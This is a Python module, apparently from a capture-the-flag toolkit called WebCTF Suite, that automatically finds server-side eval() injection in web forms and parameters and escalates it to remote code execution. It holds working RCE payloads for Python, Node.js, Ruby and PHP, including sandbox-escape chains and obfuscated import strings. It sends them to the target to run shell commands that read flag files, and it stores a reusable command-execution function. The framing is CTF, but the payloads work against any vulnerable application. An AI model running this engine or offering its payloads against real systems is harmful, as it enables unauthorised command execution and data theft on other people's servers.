"""
Eval / Code Injection Exploitation Engine for WebCTF Suite.
Handles server-side eval() RCE in Python, Node.js, Ruby, and PHP.
Detects injectable parameters via arithmetic probes, then escalates to full RCE.
"""

import re
import random
import requests
from typing import Dict, List, Any, Optional, Callable
from core.ui import print_info, print_success, print_warning, print_error, print_flag


# ──────────────────────────────────────────────────────────────────────────────
# 1. Arithmetic Confirmation Probes (Language-agnostic)
#    These are used to confirm that a parameter is eval'd server-side.
# ──────────────────────────────────────────────────────────────────────────────
def _generate_arith_probes():
    """Generate random arithmetic probes that work across Python/Node/Ruby/PHP."""
    a = random.randint(1111, 9999)
    b = random.randint(1111, 9999)
    expected = str(a * b)
    probes = [
        (f"{a}*{b}", expected, "Direct Multiply"),
        (f"({a})*({b})", expected, "Parenthesized Multiply"),
    ]
    # String concat probes (language-specific confirmation)
    probes.append(("'eval'+'test'", "evaltest", "JS/Python String Concat"))
    probes.append(('"eval"+"test"', "evaltest", "JS/Python String Concat DQ"))
    return probes, a, b, expected


# ──────────────────────────────────────────────────────────────────────────────
# 2. RCE Payload Generators per Language
# ──────────────────────────────────────────────────────────────────────────────

def get_python_eval_payloads(flag_cmd: str = "cat /flag* || cat /flag.txt || find / -name '*flag*' -exec cat {} + 2>/dev/null") -> List[Dict[str, str]]:
    """Generate Python eval() / exec() RCE payloads."""
    return [
        {
            "name": "Python __import__ os.popen",
            "payload": f"__import__('os').popen('{flag_cmd}').read()",
            "indicator": None,
        },
        {
            "name": "Python __import__ subprocess",
            "payload": f"__import__('subprocess').check_output('{flag_cmd}', shell=True).decode()",
            "indicator": None,
        },
        {
            "name": "Python builtins exec with globals",
            "payload": f"exec('import os; print(os.popen(\"{flag_cmd}\").read())')",
            "indicator": None,
        },
        {
            "name": "Python eval chain (no underscores)",
            "payload": f"eval(chr(95)*2+'import'+chr(95)*2+'(chr(111)+chr(115)).popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(42)).read()')",
            "indicator": None,
        },
        {
            "name": "Python class traversal (sandbox escape)",
            "payload": "().__class__.__base__.__subclasses__()[140].__init__.__globals__['system']('" + flag_cmd + "')",
            "indicator": None,
        },
    ]


def get_nodejs_eval_payloads(flag_cmd: str = "cat /flag* || cat /flag.txt || find / -name '*flag*' -exec cat {} + 2>/dev/null") -> List[Dict[str, str]]:
    """Generate Node.js eval() RCE payloads."""
    return [
        {
            "name": "Node.js require child_process execSync",
            "payload": f"require('child_process').execSync('{flag_cmd}').toString()",
            "indicator": None,
        },
        {
            "name": "Node.js require child_process execSync (Buffer)",
            "payload": f"require('child_process').execSync('{flag_cmd}')",
            "indicator": None,
        },
        {
            "name": "Node.js global.process.mainModule require",
            "payload": f"global.process.mainModule.require('child_process').execSync('{flag_cmd}').toString()",
            "indicator": None,
        },
        {
            "name": "Node.js process.binding spawn_sync",
            "payload": f"this.constructor.constructor('return require')()('child_process').execSync('{flag_cmd}').toString()",
            "indicator": None,
        },
        {
            "name": "Node.js Function constructor RCE",
            "payload": f"(function(){{return require('child_process').execSync('{flag_cmd}').toString()}})()",
            "indicator": None,
        },
        {
            "name": "Node.js String.constructor (sandbox bypass)",
            "payload": f"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('{flag_cmd}').toString()",
            "indicator": None,
        },
    ]


def get_ruby_eval_payloads(flag_cmd: str = "cat /flag* || cat /flag.txt") -> List[Dict[str, str]]:
    """Generate Ruby eval() RCE payloads."""
    return [
        {
            "name": "Ruby system backticks",
            "payload": f"`{flag_cmd}`",
            "indicator": None,
        },
        {
            "name": "Ruby %x()",
            "payload": f"%x({flag_cmd})",
            "indicator": None,
        },
        {
            "name": "Ruby Kernel.exec",
            "payload": f"Kernel.exec('{flag_cmd}')",
            "indicator": None,
        },
    ]


def get_php_eval_payloads(flag_cmd: str = "cat /flag* || cat /flag.txt") -> List[Dict[str, str]]:
    """Generate PHP eval() / assert() / preg_replace RCE payloads."""
    return [
        {
            "name": "PHP system()",
            "payload": f"system('{flag_cmd}')",
            "indicator": None,
        },
        {
            "name": "PHP passthru()",
            "payload": f"passthru('{flag_cmd}')",
            "indicator": None,
        },
        {
            "name": "PHP shell_exec()",
            "payload": f"shell_exec('{flag_cmd}')",
            "indicator": None,
        },
        {
            "name": "PHP exec()",
            "payload": f"exec('{flag_cmd}')",
            "indicator": None,
        },
        {
            "name": "PHP backticks",
            "payload": f"`{flag_cmd}`",
            "indicator": None,
        },
    ]


# ──────────────────────────────────────────────────────────────────────────────
# 3. Main Eval Injection Engine
# ──────────────────────────────────────────────────────────────────────────────

class EvalInjectionEngine:
    """
    Automated engine for detecting and exploiting server-side eval() / code injection.
    Works across Python, Node.js, Ruby, and PHP backends.
    """

    @staticmethod
    def detect_and_exploit(
        session: requests.Session,
        target_url: str,
        forms: List[Dict[str, Any]],
        parameters: List[str],
        endpoints: List[str],
        tech_stack: List[str],
        flag_checker: Callable,
        state: Dict[str, Any],
    ) -> bool:
        """
        Full pipeline: detect eval injection via arithmetic probes, confirm language,
        escalate to RCE, extract flags.
        Returns True if RCE was achieved.
        """
        print_info("Testing Eval / Code Injection (Server-Side eval() RCE) Vectors...")

        # Build injection targets from forms + URL params + discovered endpoints
        targets = []

        # From forms
        for form in forms:
            action = form.get("action", target_url)
            method = form.get("method", "POST").upper()
            for inp in form.get("inputs", []):
                inp_name = inp.get("name")
                inp_type = inp.get("type", "text")
                if inp_name and inp_type not in ["submit", "button", "hidden", "checkbox"]:
                    targets.append({
                        "url": action,
                        "method": method,
                        "param": inp_name,
                        "source": "form"
                    })

        # From URL params
        for param in parameters:
            targets.append({
                "url": target_url,
                "method": "GET",
                "param": param,
                "source": "url_param"
            })

        # Scan discovered endpoints for calculator/eval-like paths
        eval_keywords = ["calc", "eval", "compute", "calculate", "formula", "expression", "math", "exec", "run", "loan", "interest"]
        for ep in endpoints:
            ep_lower = ep.lower()
            if any(kw in ep_lower for kw in eval_keywords):
                # Try common param names on these endpoints
                for param in ["expression", "calc", "formula", "amount", "value", "input", "data", "query", "num", "number", "principal", "rate", "time"]:
                    targets.append({
                        "url": ep,
                        "method": "GET",
                        "param": param,
                        "source": "eval_endpoint"
                    })
                    targets.append({
                        "url": ep,
                        "method": "POST",
                        "param": param,
                        "source": "eval_endpoint"
                    })

        if not targets:
            # Fallback: try generic eval param names on main URL
            for param in ["expression", "calc", "formula", "amount", "value", "input", "data", "query", "cmd", "code"]:
                targets.append({"url": target_url, "method": "GET", "param": param, "source": "fallback"})
                targets.append({"url": target_url, "method": "POST", "param": param, "source": "fallback"})

        # Phase A: Arithmetic detection probes
        arith_probes, a, b, expected = _generate_arith_probes()

        for tgt in targets:
            url = tgt["url"]
            method = tgt["method"]
            param = tgt["param"]

            for probe_expr, expected_val, probe_name in arith_probes:
                try:
                    if method == "POST":
                        r = session.post(url, data={param: probe_expr}, timeout=5)
                    else:
                        r = session.get(url, params={param: probe_expr}, timeout=5)

                    if expected_val in r.text:
                        print_success(
                            f"Eval Injection CONFIRMED on [bold yellow]{param}[/bold yellow] "
                            f"at [bold cyan]{url}[/bold cyan] via {probe_name} "
                            f"({probe_expr} → {expected_val})!"
                        )

                        # Phase B: Determine language and escalate to RCE
                        rce_achieved = EvalInjectionEngine._escalate_to_rce(
                            session, url, method, param, tech_stack, flag_checker, state
                        )
                        if rce_achieved:
                            return True

                except Exception:
                    pass

        # Phase C: Try direct RCE payloads even without arithmetic confirmation
        # (some eval() endpoints don't return the result directly in the response)
        return EvalInjectionEngine._blind_eval_probe(
            session, targets, tech_stack, flag_checker, state
        )

    @staticmethod
    def _escalate_to_rce(
        session: requests.Session,
        url: str,
        method: str,
        param: str,
        tech_stack: List[str],
        flag_checker: Callable,
        state: Dict[str, Any],
    ) -> bool:
        """After confirming eval injection, escalate to full RCE."""
        print_info("Escalating eval injection to Remote Code Execution (RCE)...")

        flag_cmd = "cat /flag* || cat /flag.txt || find / -name '*flag*' -exec cat {} + 2>/dev/null"

        # Determine payload order based on tech stack
        all_payloads = []

        tech_lower = " ".join(tech_stack).lower()
        if "node" in tech_lower or "express" in tech_lower or "javascript" in tech_lower:
            all_payloads.extend(get_nodejs_eval_payloads(flag_cmd))
            all_payloads.extend(get_python_eval_payloads(flag_cmd))
        elif "python" in tech_lower or "flask" in tech_lower or "django" in tech_lower or "werkzeug" in tech_lower:
            all_payloads.extend(get_python_eval_payloads(flag_cmd))
            all_payloads.extend(get_nodejs_eval_payloads(flag_cmd))
        elif "ruby" in tech_lower or "rails" in tech_lower:
            all_payloads.extend(get_ruby_eval_payloads(flag_cmd))
            all_payloads.extend(get_python_eval_payloads(flag_cmd))
        elif "php" in tech_lower or "apache" in tech_lower:
            all_payloads.extend(get_php_eval_payloads(flag_cmd))
            all_payloads.extend(get_python_eval_payloads(flag_cmd))
        else:
            # Unknown tech: try all
            all_payloads.extend(get_nodejs_eval_payloads(flag_cmd))
            all_payloads.extend(get_python_eval_payloads(flag_cmd))
            all_payloads.extend(get_php_eval_payloads(flag_cmd))
            all_payloads.extend(get_ruby_eval_payloads(flag_cmd))

        for payload_info in all_payloads:
            pay = payload_info["payload"]
            name = payload_info["name"]
            try:
                if method == "POST":
                    r = session.post(url, data={param: pay}, timeout=6)
                else:
                    r = session.get(url, params={param: pay}, timeout=6)

                # Check for flag patterns
                if flag_checker(r.text, f"Eval RCE ({name})"):
                    print_success(f"[bold green]FLAG CAPTURED[/bold green] via {name} on [bold yellow]{param}[/bold yellow]!")

                    # Register active RCE method for downstream phases
                    def _rce_exec(cmd, _url=url, _method=method, _param=param, _session=session, _tech=tech_lower):
                        if "node" in _tech or "express" in _tech:
                            rce_pay = f"require('child_process').execSync('{cmd}').toString()"
                        elif "python" in _tech or "flask" in _tech:
                            rce_pay = f"__import__('os').popen('{cmd}').read()"
                        elif "php" in _tech:
                            rce_pay = f"system('{cmd}')"
                        else:
                            rce_pay = f"require('child_process').execSync('{cmd}').toString()"

                        if _method == "POST":
                            _r = _session.post(_url, data={_param: rce_pay}, timeout=8)
                        else:
                            _r = _session.get(_url, params={_param: rce_pay}, timeout=8)
                        return _r.text

                    state["active_rce_method"] = _rce_exec
                    return True

                # Check for RCE indicators even without flag
                rce_indicators = ["root:", "uid=", "www-data", "node", "/bin/", "/usr/", "total ", "drwx"]
                if any(ind in r.text for ind in rce_indicators):
                    print_success(f"RCE Confirmed via [bold green]{name}[/bold green] on [bold yellow]{param}[/bold yellow]!")

                    # Try dedicated flag extraction
                    for flag_cmd_try in [
                        "cat /flag* || cat /flag.txt",
                        "cat /root/flag.txt || cat /root/root.txt",
                        "cat /home/*/flag* || cat /app/flag*",
                        "find / -name '*flag*' -exec cat {} + 2>/dev/null",
                        "ls -la /; cat /flag*",
                        "env | grep -i flag",
                    ]:
                        if "node" in " ".join(tech_stack).lower() or "express" in " ".join(tech_stack).lower():
                            flag_pay = f"require('child_process').execSync('{flag_cmd_try}').toString()"
                        else:
                            flag_pay = f"__import__('os').popen('{flag_cmd_try}').read()"

                        try:
                            if method == "POST":
                                r2 = session.post(url, data={param: flag_pay}, timeout=6)
                            else:
                                r2 = session.get(url, params={param: flag_pay}, timeout=6)
                            flag_checker(r2.text, f"Eval RCE Flag Hunt ({flag_cmd_try})")
                        except Exception:
                            pass

                    # Register active RCE
                    def _rce_exec2(cmd, _url=url, _method=method, _param=param, _session=session, _tech=" ".join(tech_stack).lower()):
                        if "node" in _tech or "express" in _tech:
                            rce_pay = f"require('child_process').execSync('{cmd}').toString()"
                        else:
                            rce_pay = f"__import__('os').popen('{cmd}').read()"
                        if _method == "POST":
                            _r = _session.post(_url, data={_param: rce_pay}, timeout=8)
                        else:
                            _r = _session.get(_url, params={_param: rce_pay}, timeout=8)
                        return _r.text

                    state["active_rce_method"] = _rce_exec2
                    return True

            except Exception:
                pass

        return False

    @staticmethod
    def _blind_eval_probe(
        session: requests.Session,
        targets: List[Dict[str, Any]],
        tech_stack: List[str],
        flag_checker: Callable,
        state: Dict[str, Any],
    ) -> bool:
        """
        Try RCE payloads directly without prior arithmetic confirmation.
        Some eval() endpoints wrap the output or don't reflect it.
        """
        print_info("Attempting blind eval() injection probes on all discovered parameters...")

        flag_cmd = "cat /flag* || cat /flag.txt || find / -name '*flag*' -exec cat {} + 2>/dev/null"
        tech_lower = " ".join(tech_stack).lower()

        # Build a compact priority list
        priority_payloads = []
        if "node" in tech_lower or "express" in tech_lower:
            priority_payloads = [
                ("Node.js execSync", f"require('child_process').execSync('{flag_cmd}').toString()"),
                ("Node.js Function constructor", f"this.constructor.constructor('return require')()('child_process').execSync('{flag_cmd}').toString()"),
            ]
        elif "python" in tech_lower or "flask" in tech_lower or "werkzeug" in tech_lower:
            priority_payloads = [
                ("Python os.popen", f"__import__('os').popen('{flag_cmd}').read()"),
                ("Python subprocess", f"__import__('subprocess').check_output('{flag_cmd}', shell=True).decode()"),
            ]
        elif "php" in tech_lower or "apache" in tech_lower:
            priority_payloads = [
                ("PHP system()", f"system('{flag_cmd}')"),
                ("PHP passthru()", f"passthru('{flag_cmd}')"),
            ]
        else:
            priority_payloads = [
                ("Node.js execSync", f"require('child_process').execSync('{flag_cmd}').toString()"),
                ("Python os.popen", f"__import__('os').popen('{flag_cmd}').read()"),
                ("PHP system()", f"system('{flag_cmd}')"),
            ]

        seen = set()
        for tgt in targets:
            url = tgt["url"]
            method = tgt["method"]
            param = tgt["param"]
            key = f"{url}|{method}|{param}"
            if key in seen:
                continue
            seen.add(key)

            for name, pay in priority_payloads:
                try:
                    if method == "POST":
                        r = session.post(url, data={param: pay}, timeout=5)
                    else:
                        r = session.get(url, params={param: pay}, timeout=5)

                    if flag_checker(r.text, f"Blind Eval ({name})"):
                        print_success(f"Blind Eval RCE + Flag via [bold green]{name}[/bold green] on {param}!")
                        return True

                    # Also try JSON body for API endpoints
                    if method == "POST":
                        try:
                            r_json = session.post(url, json={param: pay}, timeout=5)
                            if flag_checker(r_json.text, f"Blind Eval JSON ({name})"):
                                print_success(f"Blind Eval RCE + Flag via JSON [bold green]{name}[/bold green] on {param}!")
                                return True
                        except Exception:
                            pass

                except Exception:
                    pass

        return False
